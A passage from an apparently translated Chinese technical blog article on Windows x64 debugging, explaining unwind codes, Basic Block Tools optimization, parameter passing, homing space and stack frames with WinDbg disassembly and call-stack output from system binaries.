<p>上述的ALLOC_SMALL代表函数首部的sub指令，这会在栈空间上分配0x28字节的空间，每一个PUSH_NONVOL对应一个push指令，用于将非易失性寄存器压入栈，并使用pop指令进行还原。这些指令可以在函数的汇编代码中看到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">0:000&gt; ln notepad+1234</div><div class="line">(00000000`ff971234)   notepad!StringCchPrintfW   |  (00000000`ff971364)   notepad!CheckSave</div><div class="line">Exact matches:</div><div class="line">    notepad!StringCchPrintfW = </div><div class="line">    notepad!StringCchPrintfW = </div><div class="line"></div><div class="line">0:000&gt; uf notepad!StringCchPrintfW</div><div class="line">notepad!StringCchPrintfW:</div><div class="line">00000001`00001234 mov     qword ptr [rsp+18h],r8</div><div class="line">00000001`00001239 mov     qword ptr [rsp+20h],r9</div><div class="line">00000001`0000123e push    rbx</div><div class="line">00000001`0000123f push    rbp</div><div class="line">00000001`00001240 push    rsi</div><div class="line">00000001`00001241 push    rdi</div><div class="line">00000001`00001242 sub     rsp,28h</div><div class="line">00000001`00001246 xor     ebp,ebp</div><div class="line">00000001`00001248 mov     rsi,rcx</div><div class="line">00000001`0000124b mov     ebx,ebp</div><div class="line">00000001`0000124d cmp     rdx,rbp</div><div class="line">00000001`00001250 je      notepad!StringCchPrintfW+0x27 (00000001`000077b5)</div><div class="line">...</div><div class="line">notepad!StringCchPrintfW+0x5c:</div><div class="line">00000001`00001294 mov     eax,ebx</div><div class="line">00000001`00001296 add     rsp,28h</div><div class="line">00000001`0000129a pop     rdi</div><div class="line">00000001`0000129b pop     rsi</div><div class="line">00000001`0000129c pop     rbp</div><div class="line">00000001`0000129d pop     rbx</div><div class="line">00000001`0000129e ret</div></pre></td></tr></table></figure>
<h2 id="性能优化（Performance-Optimization）"><a href="#性能优化（Performance-Optimization）" class="headerlink" title="性能优化（Performance Optimization）"></a>性能优化（Performance Optimization）</h2><p>Windows操作系统中的可执行文件采用了一种叫做Basic Block Tools(BBT)的优化，这种优化会提升代码的局部性。频繁执行的函数块被放在一起，这样会更可能放在相同的页上，而对于那些不频繁使用的部分被移到其他位置。这种方法减少了需要同时保留在内存中的页数，从而导致整个working set的减少。为了使用这种优化方案，可执行文件会被链接、执行、评测，最后，使用评测结果重新组合那些频繁执行的函数部分。</p>
<p>在重组过的函数中，一些函数块被移出函数主体，这些原本是定义在RUNTIME_FUNCTION结构中的。由于函数块的移动，导致函数体被分割成多个不同的部分。因此，链接过程中生成的UNTIME_FUNCTION结构已经不能再准确地描述这个函数。为了解决这个问题，BBT过程新增了多个RUNTIME_FUNCTION结构，每一个RUNTIME_FUNCTION对应一个优化过的函数块。这些RUNTIME_FUNCTION被链在一起，以最初的RUNTIME_FUNTION结尾，这样，最后的这个RUNTIME_FUNTION的BeginAddress会一直指向函数的首地址。</p>
<p>图7展示了由3个基础块组成的函数。在BBT优化以后，#2块被移除函数体，从而导致原先的RUNTIME_FUNCTION的信息失效。所以，BBT优化过程创建了第二个RUNTIME_FUNCTION结构，并将它串联到第一个，下图描述了整个过程。</p>
<p><img src="/images/x64deepdive/7.png" alt="Figure 7 : Performance Optimization : Basic Block Tools"></p>
<p>当前公开版本的调试器不能回溯RUNTIME_FUNCTION的完整链，所以，调试器不能正确地显示优化过的函数名，相应的返回地址映射到那些被移出函数体的函数块。</p>
<p>下面的例子展示了函数的调用栈，其中，函数名不能正常显示，取而代之的是ntdll! ?? ::FNODOBFM::`string’。调试器错误地将返回地址0x00000000`77c17623转成#0x0c号栈帧的函数名ntdll! ?? ::FNODOBFM::`string’+0x2bea0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">0:000&gt; kn</div><div class="line"> # Child-SP          RetAddr           Call Site</div><div class="line">00 00000000`0029e4b8 000007fe`fdd21726 ntdll! ?? ::FNODOBFM::`string&apos;+0x6474</div><div class="line">01 00000000`0029e4c0 000007fe`fdd2dab6 KERNELBASE!BaseSetLastNTError+0x16</div><div class="line">02 00000000`0029e4f0 00000000`77ad108f KERNELBASE!AccessCheck+0x64</div><div class="line">03 00000000`0029e550 00000000`77ad0d46 kernel32!BasepIsServiceSidBlocked+0x24f</div><div class="line">04 00000000`0029e670 00000000`779cd161 kernel32!LoadAppInitDlls+0x36</div><div class="line">05 00000000`0029e6e0 00000000`779cd42d user32!ClientThreadSetup+0x22e</div><div class="line">06 00000000`0029e950 00000000`77c1fdf5 user32!_ClientThreadSetup+0x9</div><div class="line">07 00000000`0029e980 000007fe`ffe7527a ntdll!KiUserCallbackDispatcherContinue</div><div class="line">08 00000000`0029e9d8 000007fe`ffe75139 gdi32!ZwGdiInit+0xa</div><div class="line">09 00000000`0029e9e0 00000000`779ccd1f gdi32!GdiDllInitialize+0x11b</div><div class="line">0a 00000000`0029eb40 00000000`77c0c3b8 user32!UserClientDllInitialize+0x465</div><div class="line">0b 00000000`0029f270 00000000`77c18368 ntdll!LdrpRunInitializeRoutines+0x1fe</div><div class="line">0c 00000000`0029f440 00000000`77c17623 ntdll!LdrpInitializeProcess+0x1c9b</div><div class="line">0d 00000000`0029f940 00000000`77c0308e ntdll! ?? ::FNODOBFM::`string&apos;+0x2bea0</div><div class="line">0e 00000000`0029f9b0 00000000`00000000 ntdll!LdrInitializeThunk+0xe</div></pre></td></tr></table></figure>
<p>下面的例子将使用上面用到的返回地址0x00000000`77c17623来显示错误函数名的RUNTIME_FUNCTION，UNWIND_INFO和UNWIND_CODEs。显示的信息包含一个名为”Chained Info”的段，用于指示函数代码块被移出函数体。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">0:000&gt; .fnent 00000000`77c17623</div><div class="line">Debugger function entry 00000000`03b35da0 for:</div><div class="line">(00000000`77c55420)   ntdll! ?? ::FNODOBFM::`string&apos;+0x2bea0   |  (00000000`77c55440)   ntdll! ?? ::FNODOBFM::`string&apos;</div><div class="line"></div><div class="line">BeginAddress      = 00000000`000475d3</div><div class="line">EndAddress        = 00000000`00047650</div><div class="line">UnwindInfoAddress = 00000000`0012eac0</div><div class="line"></div><div class="line">Unwind info at 00000000`77cfeac0, 10 bytes</div><div class="line">  version 1, flags 4, prolog 0, codes 0</div><div class="line">  frame reg 0, frame offs 0</div><div class="line"></div><div class="line">Chained info:</div><div class="line">BeginAddress      = 00000000`000330f0</div><div class="line">EndAddress        = 00000000`000331c0</div><div class="line">UnwindInfoAddress = 00000000`0011d08c</div><div class="line"></div><div class="line">Unwind info at 00000000`77ced08c, 20 bytes</div><div class="line">  version 1, flags 1, prolog 17, codes a</div><div class="line">  frame reg 0, frame offs 0</div><div class="line">  handler routine: 00000000`79a2e560, data 0</div><div class="line">  00: offs f0, unwind op 0, op info 3	UWOP_PUSH_NONVOL</div><div class="line">  01: offs 3, unwind op 0, op info 0	UWOP_PUSH_NONVOL</div><div class="line">  02: offs c0, unwind op 1, op info 3	UWOP_ALLOC_LARGE FrameOffset: d08c0003</div><div class="line">  04: offs 8c, unwind op 0, op info d	UWOP_PUSH_NONVOL</div><div class="line">  05: offs 11, unwind op 0, op info 0	UWOP_PUSH_NONVOL</div><div class="line">  06: offs 28, unwind op 0, op info 0	UWOP_PUSH_NONVOL</div><div class="line">  07: offs 0, unwind op 0, op info 0	UWOP_PUSH_NONVOL</div><div class="line">  08: offs 0, unwind op 0, op info 0	UWOP_PUSH_NONVOL</div><div class="line">  09: offs 0, unwind op 0, op info 0	UWOP_PUSH_NONVOL</div></pre></td></tr></table></figure>
<p>上面说到的Chained Info中BeginAddress指向原先函数的首地址，可以使用<code>ln</code>命令看看这个函数的实际函数名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0:000&gt; ln ntdll+000330f0</div><div class="line">(00000000`77c030f0)   ntdll!LdrpInitialize   |  (00000000`77c031c0)   ntdll!LdrpAllocateTls</div><div class="line">Exact matches:</div><div class="line">    ntdll!LdrpInitialize =</div></pre></td></tr></table></figure>
<p>调试器的<code>uf</code>命令可以显示完整的函数汇编代码，这个命令之所以可以做到这点，是通过每个代码块最后的jmp/jCC指令来访问所有的代码块。下面的输出展示了函数ntdll!LdrpInitialize的汇编代码，函数主体是从00000000`77c030f0到00000000`77c031b3，然而，有一个代码块是在00000000`77bfd1a4。这样的代码移动是由于BBT优化的结果，调试器尝试将这个地址与最近的符号对应起来，也就是上面说到的 “ntdll! ?? ::FNODOBFM::`string’+0x2c01c”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">0:000&gt; uf 00000000`77c030f0</div><div class="line">ntdll! ?? ::FNODOBFM::`string&apos;+0x2c01c:</div><div class="line">00000000`77bfd1a4 48c7842488000000206cfbff mov qword ptr [rsp+88h],0FFFFFFFFFFFB6C20h</div><div class="line">00000000`77bfd1b0 443935655e1000  cmp     dword ptr [ntdll!LdrpProcessInitialized (00000000`77d0301c)],r14d</div><div class="line">00000000`77bfd1b7 0f856c5f0000    jne     ntdll!LdrpInitialize+0x39 (00000000`77c03129)</div><div class="line">.</div><div class="line">.</div><div class="line">.</div><div class="line">ntdll!LdrpInitialize:</div><div class="line">00000000`77c030f0 48895c2408      mov     qword ptr [rsp+8],rbx</div><div class="line">00000000`77c030f5 4889742410      mov     qword ptr [rsp+10h],rsi</div><div class="line">00000000`77c030fa 57              push    rdi</div><div class="line">00000000`77c030fb 4154            push    r12</div><div class="line">00000000`77c030fd 4155            push    r13</div><div class="line">00000000`77c030ff 4156            push    r14</div><div class="line">00000000`77c03101 4157            push    r15</div><div class="line">00000000`77c03103 4883ec40        sub     rsp,40h</div><div class="line">00000000`77c03107 4c8bea          mov     r13,rdx</div><div class="line">00000000`77c0310a 4c8be1          mov     r12,rcx</div><div class="line">.</div><div class="line">.</div><div class="line">.</div><div class="line">ntdll!LdrpInitialize+0xac:</div><div class="line">00000000`77c0319c 488b5c2470      mov     rbx,qword ptr [rsp+70h]</div><div class="line">00000000`77c031a1 488b742478      mov     rsi,qword ptr [rsp+78h]</div><div class="line">00000000`77c031a6 4883c440        add     rsp,40h</div><div class="line">00000000`77c031aa 415f            pop     r15</div><div class="line">00000000`77c031ac 415e            pop     r14</div><div class="line">00000000`77c031ae 415d            pop     r13</div><div class="line">00000000`77c031b0 415c            pop     r12</div><div class="line">00000000`77c031b2 5f              pop     rdi</div><div class="line">00000000`77c031b3 c3              ret</div></pre></td></tr></table></figure>
<p>经过BBT优化过的模块可以被<code>!lmi</code>命令识别出来，在命令的输出中，”Characteristics”域会标示为”perf”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">0:000&gt; !lmi notepad</div><div class="line">Loaded Module Info: [notepad] </div><div class="line">         Module: notepad</div><div class="line">   Base Address: 00000000ff4f0000</div><div class="line">     Image Name: notepad.exe</div><div class="line">   Machine Type: 34404 (X64)</div><div class="line">     Time Stamp: 4a5bc9b3 Mon Jul 13 16:56:35 2009</div><div class="line">           Size: 35000</div><div class="line">       CheckSum: 3e749</div><div class="line">Characteristics: 22  perf</div><div class="line">Debug Data Dirs: Type  Size     VA  Pointer</div><div class="line">             CODEVIEW    24,  b74c,    ad4c RSDS - GUID: &#123;36CFD5F9-888C-4483-B522-B9DB242D8478&#125;</div><div class="line">               Age: 2, Pdb: notepad.pdb</div><div class="line">                CLSID     4,  b748,    ad48 [Data not mapped]</div><div class="line">     Image Type: MEMORY   - Image read successfully from loaded memory.</div><div class="line">    Symbol Type: PDB      - Symbols loaded successfully from symbol server.</div><div class="line">                 c:\symsrv\notepad.pdb\36CFD5F9888C4483B522B9DB242D84782\notepad.pdb</div><div class="line">    Load Report: public symbols , not source indexed </div><div class="line">                 c:\symsrv\notepad.pdb\36CFD5F9888C4483B522B9DB242D84782\notepad.pdb</div></pre></td></tr></table></figure>
<h1 id="参数传递（Parameter-Passing）"><a href="#参数传递（Parameter-Passing）" class="headerlink" title="参数传递（Parameter Passing）"></a>参数传递（Parameter Passing）</h1><p>本节讨论X64平台上参数是如何传递的，函数栈帧是如何构建的，以及调试器如何使用这些信息回溯调用栈。</p>
<h2 id="基于寄存器的参数传递（Register-based-parameter-passing）"><a href="#基于寄存器的参数传递（Register-based-parameter-passing）" class="headerlink" title="基于寄存器的参数传递（Register based parameter passing）"></a>基于寄存器的参数传递（Register based parameter passing）</h2><p>在X64平台上，函数的前4个参数是通过寄存器传递，剩余的参数是通过栈传递。这是调试过程中最主要的痛苦之一，因为寄存器的值在函数执行过程中会被修改，从而导致很难确定传入函数的参数值是什么。另外一个问题是参数恢复问题，X64平台上的调试与X86平台上的调试有很大的差异。</p>
<p>图8展示了X64汇编代码如何在调用函数与被调函数之间传递参数的。</p>
<p><img src="/images/x64deepdive/8.png" alt="Figure 8 : Parameter Passing on X64"></p>
<p>下面的调用栈展示函数kernel32!CreateFileWImplementation调用 KERNELBASE!CreateFileW。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">0:000&gt; kn</div><div class="line"> # Child-SP          RetAddr           Call Site</div><div class="line">00 00000000`0029bbf8 000007fe`fdd24d76 ntdll!NtCreateFile</div><div class="line">01 00000000`0029bc00 00000000`77ac2aad KERNELBASE!CreateFileW+0x2cd</div><div class="line">02 00000000`0029bd60 000007fe`fe5b9ebd kernel32!CreateFileWImplementation+0x7d</div><div class="line">.</div><div class="line">.</div><div class="line">.</div></pre></td></tr></table></figure>
<p>从MSDN的文档上来看，函数CreateFileW()有7个参数，函数原型如下：<br>HANDLE WINAPI<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">CreateFile(</div><div class="line">  __in      LPCTSTR lpFileName,</div><div class="line">  __in      DWORD dwDesiredAccess,</div><div class="line">  __in      DWORD dwShareMode,</div><div class="line">  __in_opt  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</div><div class="line">  __in      DWORD dwCreationDisposition,</div><div class="line">  __in      DWORD dwFlagsAndAttributes,</div><div class="line">  __in_opt  HANDLE hTemplateFile );</div></pre></td></tr></table></figure></p>
<p>从上面的调用栈可以看出，函数KERNELBASE!CreateFileW的返回地址是00000000`77ac2aad。可以反向显示这个地址的汇编代码，那样，就可以看到调用KERNELBASE!CreateFileW之前的代码。下面这4条指令：”mov rcx,rdi”, “mov edx,ebx”, “mov r8d,ebp”, “mov r9,rsi” 是在做调用kernel32!CreateFileW函数的准备工作，将前4个参数放在寄存器上。同样，下面这几条指令：”mov dword ptr [rsp+20h],eax”, “mov dword ptr [rsp+28h],eax” and “mov qword ptr [rsp+30h],rax” 是将参数放在栈帧上。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0:000&gt; ub  00000000`77ac2aad L10</div><div class="line">kernel32!CreateFileWImplementation+0x35:</div><div class="line">00000000`77ac2a65 lea     rcx,[rsp+40h]</div><div class="line">00000000`77ac2a6a mov     edx,ebx</div><div class="line">00000000`77ac2a6c call    kernel32!BaseIsThisAConsoleName (00000000`77ad2ca0)</div><div class="line">00000000`77ac2a71 test    rax,rax</div><div class="line">00000000`77ac2a74 jne     kernel32!zzz_AsmCodeRange_End+0x54fc (00000000`77ae7bd0)</div><div class="line">00000000`77ac2a7a mov     rax,qword ptr [rsp+90h]</div><div class="line">00000000`77ac2a82 mov     r9,rsi</div><div class="line">00000000`77ac2a85 mov     r8d,ebp</div><div class="line">00000000`77ac2a88 mov     qword ptr [rsp+30h],rax</div><div class="line">00000000`77ac2a8d mov     eax,dword ptr [rsp+88h]</div><div class="line">00000000`77ac2a94 mov     edx,ebx</div><div class="line">00000000`77ac2a96 mov     dword ptr [rsp+28h],eax</div><div class="line">00000000`77ac2a9a mov     eax,dword ptr [rsp+80h]</div><div class="line">00000000`77ac2aa1 mov     rcx,rdi</div><div class="line">00000000`77ac2aa4 mov     dword ptr [rsp+20h],eax</div><div class="line">00000000`77ac2aa8 call    kernel32!CreateFileW (00000000`77ad2c88)</div></pre></td></tr></table></figure>
<h2 id="Homing-Space"><a href="#Homing-Space" class="headerlink" title="Homing Space"></a>Homing Space</h2><p>虽然前4个参数被放在寄存器上，但是，在栈帧空间上依然会分配相应的空间。这个叫做参数的Homing Space, 用于存放参数的值，如果函数是通过地址访问参数，或者函数编译过程中打开/homeparams标志。这个Homing Space的最小空间尺寸是0x20个字节，即便函数的参数小于4个。如果Homing Space没有用于存放参数的值，编译器会用它们存放非易失性寄存器的值。</p>
<p>图9展示了栈空间上的Homing Space，以及在函数初始阶段是如何将非易失性寄存器的值存放在Homing Space中。</p>
<p><img src="/images/x64deepdive/9.png" alt="Figure 9 : Parameter Homing Space"></p>
<p>在下面的例子中，指令”sub rsp, 20h”表明函数初始阶段在栈空间上分配了0x20个字节的空间，这已足以存放4个64位的值。下面一部分显示msvcrt!malloc()是一个no-leaf函数，它会调用其他的函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">0:000&gt; uf msvcrt!malloc</div><div class="line">msvcrt!malloc:</div><div class="line">000007fe`fe6612dc mov     qword ptr [rsp+8],rbx</div><div class="line">000007fe`fe6612e1 mov     qword ptr [rsp+10h],rsi</div><div class="line">000007fe`fe6612e6 push    rdi</div><div class="line">000007fe`fe6612e7 sub     rsp,20h</div><div class="line">000007fe`fe6612eb cmp     qword ptr [msvcrt!crtheap (000007fe`fe6f1100)],0</div><div class="line">000007fe`fe6612f3 mov     rbx,rcx</div><div class="line">000007fe`fe6612f6 je      msvcrt!malloc+0x1c (000007fe`fe677f74)</div><div class="line">.</div><div class="line">.</div><div class="line">.</div><div class="line"></div><div class="line">0:000&gt; uf /c msvcrt!malloc</div><div class="line">msvcrt!malloc (000007fe`fe6612dc)</div><div class="line">  msvcrt!malloc+0x6a (000007fe`fe66132c):</div><div class="line">    call to ntdll!RtlAllocateHeap (00000000`77c21b70)</div><div class="line">  msvcrt!malloc+0x1c (000007fe`fe677f74):</div><div class="line">    call to msvcrt!core_crt_dll_init (000007fe`fe66a0ec)</div><div class="line">  msvcrt!malloc+0x45 (000007fe`fe677f83):</div><div class="line">    call to msvcrt!FF_MSGBANNER (000007fe`fe6ace0c)</div><div class="line">  msvcrt!malloc+0x4f (000007fe`fe677f8d):</div><div class="line">    call to msvcrt!NMSG_WRITE (000007fe`fe6acc10)</div><div class="line">  msvcrt!malloc+0x59 (000007fe`fe677f97):</div><div class="line">    call to msvcrt!_crtExitProcess (000007fe`fe6ac030)</div><div class="line">  msvcrt!malloc+0x83 (000007fe`fe677fad):</div><div class="line">    call to msvcrt!callnewh (000007fe`fe696ad0)</div><div class="line">  msvcrt!malloc+0x8e (000007fe`fe677fbb):</div><div class="line">    call to msvcrt!errno (000007fe`fe661918)</div><div class="line">.</div><div class="line">.</div><div class="line">.</div></pre></td></tr></table></figure>
<p>下面的汇编代码片段是WinMain函数的初始阶段，4个非易失性寄存器将被保存在栈空间上的Homing Space。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">0:000&gt; u notepad!WinMain</div><div class="line">notepad!WinMain:</div><div class="line">00000000`ff4f34b8 mov     rax,rsp</div><div class="line">00000000`ff4f34bb mov     qword ptr [rax+8],rbx</div><div class="line">00000000`ff4f34bf mov     qword ptr [rax+10h],rbp</div><div class="line">00000000`ff4f34c3 mov     qword ptr [rax+18h],rsi</div><div class="line">00000000`ff4f34c7 mov     qword ptr [rax+20h],rdi</div><div class="line">00000000`ff4f34cb push    r12</div><div class="line">00000000`ff4f34cd sub     rsp,70h</div><div class="line">00000000`ff4f34d1 xor     r12d,r12d</div></pre></td></tr></table></figure>
<h2 id="Parameter-Homing"><a href="#Parameter-Homing" class="headerlink" title="Parameter Homing"></a>Parameter Homing</h2><p>如上一节所描述，所有的X64 non-leaf函数都会在他们的栈空间中分配相应的Homing Space。如X64的调用约定，调用函数使用4个寄存器传递参数给被调函数。当使用/homeparams标志开启参数空间时，只有被调函数的代码会受到影响。使用Windows Driver Kit(WDK)编译环境，在checked/debug build中，这个标志一直是打开的。被调函数的初始化阶段从寄存器中读取参数的值，并将这些值存放在参数的homing space中。</p>
<p>图10展示了调用函数的汇编代码，它将参数传到相应的寄存器中。同时，也展示了被调函数的初始化阶段，这个函数使用了/homeparams标志，从而，会将参数放在homing space上。被调函数的初始化阶段从寄存器中读取参数，并将这些值存放在栈上的参数homing space中。</p>
<p><img src="/images/x64deepdive/10.png" alt="Figure 10 : Parameter Homing"></p>
<p>下面的代码片段展示了寄存器的值被存放在homing area上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0:000&gt; uf msvcrt!printf</div><div class="line">msvcrt!printf:</div><div class="line">000007fe`fe667e28 mov     rax,rsp</div><div class="line">000007fe`fe667e2b mov     qword ptr [rax+8],rcx</div><div class="line">000007fe`fe667e2f mov     qword ptr [rax+10h],rdx</div><div class="line">000007fe`fe667e33 mov     qword ptr [rax+18h],r8</div><div class="line">000007fe`fe667e37 mov     qword ptr [rax+20h],r9</div><div class="line">000007fe`fe667e3b push    rbx</div><div class="line">000007fe`fe667e3c push    rsi</div><div class="line">000007fe`fe667e3d sub     rsp,38h</div><div class="line">000007fe`fe667e41 xor     eax,eax</div><div class="line">000007fe`fe667e43 test    rcx,rcx</div><div class="line">000007fe`fe667e46 setne   al</div><div class="line">000007fe`fe667e49 test    eax,eax</div><div class="line">000007fe`fe667e4b je      msvcrt!printf+0x25 (000007fe`fe67d74b)</div><div class="line">.</div><div class="line">.</div><div class="line">.</div></pre></td></tr></table></figure>
<h2 id="堆栈使用（Stack-Usage）"><a href="#堆栈使用（Stack-Usage）" class="headerlink" title="堆栈使用（Stack Usage）"></a>堆栈使用（Stack Usage）</h2><p>X64函数的栈帧包括下面内容：</p>
<ul>
<li>返回地址</li>
<li>非易失性寄存器的值</li>
<li>局部变量</li>
<li>基于栈的参数</li>
<li>基于寄存器的参数</li>
</ul>
<p>除了返回地址之前，其他都是在函数初始阶段存放的。栈空间由局部变量、基于栈的参数和参数Homing Space组成，并且都是由这样的一条指令完成空间分配的：”sub rsp, xxx”。为基于栈的参数所预留的空间可以为调用者提供空间存放绝大多数的参数，基于寄存器的参数homing space只在non-leaf函数中保留。</p>
<p>图11展示X64 CPU上函数栈帧的布局。</p>
<p><img src="/images/x64deepdive/11.png" alt="Figure 11 : Stack Usage"></p>
<p>调试器的”knf”命令可以显示调用栈上每一个栈帧所需的空间，这个值被放在”Memory”一栏。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">0:000&gt; knf</div><div class="line"> #   Memory  Child-SP          RetAddr           Call Site</div><div class="line">00           00000000`0029bbf8 000007fe`fdd24d76 ntdll!NtCreateFile</div><div class="line">01         8 00000000`0029bc00 00000000`77ac2aad KERNELBASE!CreateFileW+0x2cd</div><div class="line">02       160 00000000`0029bd60 000007fe`fe5b9ebd kernel32!CreateFileWImplementation+0x7d</div><div class="line">03        60 00000000`0029bdc0 000007fe`fe55dc08 usp10!UniStorInit+0xdd</div><div class="line">04        a0 00000000`0029be60 000007fe`fe5534af usp10!InitUnistor+0x1d8</div></pre></td></tr></table></figure>
<p>下面的汇编代码片段展示CreateFileW函数的初始阶段，将非易失性寄存器R8D和EDX的值保存在参数空间中，将RBX,RBP,RSI,RDI压入栈上，然后，分配0x138字节的空间，用于存放局部变量和将要传给被调函数的参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">0:000&gt; uf KERNELBASE!CreateFileW</div><div class="line">KERNELBASE!CreateFileW:</div><div class="line">000007fe`fdd24ac0 mov     dword ptr [rsp+18h],r8d</div><div class="line">000007fe`fdd24ac5 mov     dword ptr [rsp+10h],edx</div><div class="line">000007fe`fdd24ac9 push    rbx</div><div class="line">000007fe`fdd24aca push    rbp</div><div class="line">000007fe`fdd24acb push    rsi</div><div class="line">000007fe`fdd24acc push    rdi</div><div class="line">000007fe`fdd24acd sub     rsp,138h</div><div class="line">000007fe`fdd24ad4 mov     edi,dword ptr [rsp+180h]</div><div class="line">000007fe`fdd24adb mov     rsi,r9</div><div class="line">000007fe`fdd24ade mov     rbx,rcx</div><div class="line">000007fe`fdd24ae1 mov     ebp,2</div><div class="line">000007fe`fdd24ae6 cmp     edi,3</div><div class="line">000007fe`fdd24ae9 jne     KERNELBASE!CreateFileW+0x449 (000007fe`fdd255ff)</div></pre></td></tr></table></figure>
<h2 id="Child-SP"><a href="#Child-SP" class="headerlink" title="Child-SP"></a>Child-SP</h2><p>调试命令<code>k</code>显示的Child-SP寄存器的值代表着RSP寄存器所指向的地址，也就是所显示的函数在完成函数初始阶段之后，栈顶指针的位置。</p>
<p>随后被压入栈的是函数的返回地址，由于X64函数在函数初始化以后不会修改RSP，任何涉及栈访问的操作都是通过这个栈指针（RSP）完成的，包括访问参数和局部变量。</p>
<p>图12展示函数f2的栈帧以及它与命令<code>k</code>所显示的调用栈之间的关系。返回地址RA1指向函数f2在调用<code>call f1</code>这条指令之后的位置，这个地址出现在调用栈上紧邻RSP2所指向的位置。</p>
<p><img src="/images/x64deepdive/12.png" alt="Figure 12 : Relationship between Child-SP and function frames"></p>
